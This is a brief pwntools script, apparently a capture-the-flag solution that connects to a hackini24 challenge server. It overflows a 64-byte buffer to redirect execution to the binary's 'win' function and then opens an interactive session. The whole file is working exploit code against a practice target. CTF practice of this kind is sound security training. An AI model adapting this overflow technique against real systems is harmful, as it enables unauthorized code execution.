from pwn import * 


context.binary = elf =ELF('./chall')
context.log_level='debug'

p =remote('sportsman.hackini24.shellmates.club',443,ssl=True)

p.recv()

p.sendline(b'1')
p.recv()

payload=flat(
	b'a'*64
	,elf.symbols['win']
	)
p.sendline(payload)
win =elf.symbols['win']





p.recv()

p.sendline(b'3')




p.interactive()

